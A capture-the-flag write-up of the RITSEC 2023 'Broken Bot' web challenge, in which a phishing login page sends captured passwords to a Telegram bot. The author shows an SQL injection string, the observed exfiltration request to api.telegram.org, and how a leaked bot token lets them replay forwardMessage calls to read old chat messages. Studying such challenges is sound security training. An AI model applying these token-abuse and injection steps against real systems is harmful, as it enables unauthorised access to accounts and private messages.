---
layout: post
title:  RITSEC 2023 - Web / Broken Bot
summary: 'Writeup for RITSEC 2023 "Broken Bot" Challenge'
author: leo
date: '2023-04-02 00:00:00 -0400'
category: ritsec-ctf-2023
thumbnail: /assets/img/posts/ritsec-ctf-2023/logo.png
include_thumbnail: false
keywords: security, ctf, ritsec
permalink: /blog/ritsec-ctf-2023/web/broken-bot
usemathjax: true
---

# Exploring the App
Launching the site, you are brought to a login page where the username is already set to `whiteteam at rit dot edu`. My first thoughts were with regard to SQL Injection or default credentials.  I started with your standard sql injection attack by adding a password of `' or 1=1-- -`.  What happened next was quite interesting, and somewhat comical!  After a brief pause, you are redirected to another site with someone's [voicemail recording](https://archive.org/details/VoiceMail_173).  ...Yep, nobody's there right now.  Where this is a separate site, my assumption is that it's not part of the challenge, and we missed something interesting on the login form.  Let's go back to that.

# How Did We Get There?
This time, I have my network tools open in my browser so I can watch the traffic.  I also start looking at the source code, and find a whole bunch of obfsucated JavaScript.  Having a background in JS, I start trying to un-obfsucate it.... and I finally get to the point where I realize I'm wasting my time a bit.  I don't need to do all of that work yet, if I still don't understand the _behavior_ of the site.  This is probably a rabbit hole that I don't need to follow.

I monitor the network after I add a garbage password, and notice that there are a couple of requests that I wasn't expecting _before_ I'm redirected to the voicemail page:
- [https://ip.seeip.org/geoip](https://ip.seeip.org/geoip)
- [https://api.telegram.org/xxxx:xxxxx/sendMessage](https://api.telegram.org/xxxx:xxxxx/sendMessage)

# The Telegram Call
The geoip call is made before the telegram request, and it does precisely what you think it would.  The telegram request is really interesting though.  Let's inspect this a bit more.  This is a POST request, and it has a body of the following:
```
chat_id: 5852841790
text: ***Rit Cloud Storage by Zach A**

Email: WhiteTeam@rit.edu
Password : asdf
IP Address : xxx.xxx.xxx.xxx
Region : undefined
City : undefined
Country : United States
Useragent : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Format : WhiteTeam@rit.edu
Date Filled : 4/2/2023
DateSent : 1/28/2023 2:55:30 p.m.
```
I'm no Telegram expert, but we are sending a plaintext password to telegram, and we presumably have everything we need to control that bot.  Now we need to learn what the bot can do, and get it to give us old messages so we can find the legitimate sign-in (which may or may not bring you somewhere else, or just be the flag).

# Telegram's Bot API
By design, the Telegram Bot API does not allow you to pull back arbitrary messages from a room, even if the bot is in that room.  I found this by googling around, and unfortunately didn't note the sources where I read it.  However, bots are intended to be used as a means of interacting within a room.  Either way, let's [read the docs](https://core.telegram.org/bots/api) to learn more about the capabilities.


## SendMessage
First, we know we are using the `sendMessage` API.  Presumably, we are sending that payload as a message to the room.  We also have the `chatId` and the bot's super secret special URL. Note the following in the docs:
> On success, the sent Message is returned

Great!  We know that we can get a Message object as a return object.

## getMe
There's an endpoint that gets the current bot's metadata.  Let's see if there's anything useful there:
```json
{
    "ok":true,
    "result": {
        "id":6055124896,
        "is_bot":true,
        "first_name":"RIT_CTF_Telegram_Bot",
        "username":"xxxxx",
        "can_join_groups":true,
        "can_read_all_group_messages":true,
        "supports_inline_queries":false
    }
}
```
I was really excited about the `can_read_all_group_messages` permission, but as mentioned earlier, it's not something we can use in a straightforward way.

## getMyDefaultAdministratorRights
This is another interesting looking endpoint, let's see what it returns:
```json
{
    "ok":true,
    "result":{
        "can_manage_chat":false,
        "can_change_info":false,
        "can_delete_messages":false,
        "can_invite_users":false,
        "can_restrict_members":false,
        "can_pin_messages":false,
        "can_manage_topics":false,
        "can_promote_members":false,
        "can_manage_video_chats":false,
        "is_anonymous":false
    }
}
```
Ok, fine.  No smoking gun here, but at least we know what it has permission to do.

## How do we read a previous Message?
I'm quite sure at this point I need to exfil old messages from the specific chat.  I noted earlier that the `sendMessage` api returns a Message object, let's see if we can find any other endpoints that will do the same. I searched the api documentation for the exact phrase. `Message is returned`.  There are a lot of results (24 or so), but the 2nd instance is for `forwardMessage`.
<br /><br />
![Telegram's forwardMessage API Reference](/assets/img/posts/ritsec-ctf-2023/broken-bot/forwardMessage.png "Telegram's forwardMessage API Reference")
<br /><br />
There's no need to be quiet in this scenario, so we can probably forward the message back into the same channel without consequence.  Let's start by just checking the first known message in this chat, and keep going until we find it.  Our request will look something like this:
```
https://api.telegram.org/xxxx:xxxx/forwardMessage?chat_id=5852841790&from_chat_id=5852841790&message_id=1
```
Results:
```json
{
    "ok":true,
    "result":{
        "message_id":4882,
        "from":{
            "id":6055124896,
            "is_bot":true,
            "first_name":"RIT_CTF_Telegram_Bot",
            "username":"rochesterissodamncoldbot"
        },
        "chat":{
            "id":5852841790,
            "first_name":"Z",
            "username":"l337Hackzor",
            "type":"private"
        },
        "date":1680532307,
        "forward_from":{
            "id":5852841790,
            "is_bot":false,
            "first_name":"Z",
            "username":"l337Hackzor",
            "language_code":"en"
        },
        "forward_date":1679057324,
        "text":"/start",
        "entities":[{"offset":0,"length":6,"type":"bot_command"}]
    }
}
```

This is awesome, we now have the first message ever sent.  Now all we need to do is keep incrementing the `message_id` query param until we find one with valid credentials or a flag.  In this case, the flag was in message_id 8.

# Conclusion
I _REALLY_ enjoyed this challenge! I actually liked that the JavaScript was a rabbit-hole, as it's helping me focus my time on more meaningful enumeration.  While I eventually would have figured out what the JS was doing by de-obfuscating it, I was easily able to figure it out just by watching the _behavior_.  Additionally, this is more of a real-world scenario where someone sets up a bot or automation, and doesn't do enough to protect the credentials.  In this case, it appears that the bot's URL is kind of like a webhook URL, in that you **need to protect it the same way you do passwords**, otherwise bad actors could abuse it.
